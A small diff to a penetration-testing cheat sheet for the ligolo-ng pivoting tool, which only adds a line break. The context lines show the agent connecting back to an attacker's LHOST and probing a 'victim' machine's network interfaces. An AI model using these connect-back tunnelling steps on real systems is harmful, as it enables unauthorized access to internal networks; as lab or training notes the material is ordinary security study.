@@ -21,7 +21,7 @@ sudo ip link set ligolo up
 ```./agent -connect <LHOST>:lport -ignore-cert```
 
 ### List the sessions
-```ligolo-ng » session ``` #list session
+```ligolo-ng » session ``` #list session<br/>
 ```[Agent : client@client-virtual-machine] » ifconfig``` #check different network interfaces that victim connected
 ```You will receive result something like below
    ┌───────────────────────────────────────────────┐
